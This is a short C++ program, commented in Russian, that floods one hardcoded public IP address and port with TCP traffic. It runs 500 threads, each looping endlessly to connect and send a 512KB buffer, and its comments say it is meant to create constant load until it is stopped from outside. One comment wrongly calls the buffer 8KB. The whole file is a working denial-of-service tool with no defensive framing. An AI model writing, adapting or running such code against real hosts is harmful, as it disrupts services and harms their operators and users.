#include <iostream>
#include <thread>
#include <vector>
#include <cstring>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

void send_load(const std::string &server_ip, int server_port, const std::string &data) {
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);

    if (inet_pton(AF_INET, server_ip.c_str(), &server_addr.sin_addr) <= 0) {
        std::cerr << "Invalid address/ Address not supported \n";
        return;
    }

    while (true) { // Бесконечный цикл для постоянной нагрузки
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            std::cerr << "Socket creation error \n";
            return;
        }

        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            std::cerr << "Connection Failed \n";
            close(sock);
            continue;
        }

        send(sock, data.c_str(), data.size(), 0);
        close(sock);
    }
}

int main() {
    std::string server_ip = "95.217.53.168";
    int server_port = 25869;

    // Генерация большого объема данных для отправки
    std::string large_data(524288, 'A'); // 8KB данных (можно увеличить)

    int num_threads = 500; // Количество потоков

    std::vector<std::thread> threads;

    // Запуск потоков для создания постоянной нагрузки
    for (int i = 0; i < num_threads; ++i) {
        threads.emplace_back(send_load, server_ip, server_port, large_data);
    }

    // Ожидание завершения всех потоков (программа завершится только при внешнем вмешательстве)
    for (auto &t : threads) {
        t.join();
    }

    return 0;
}
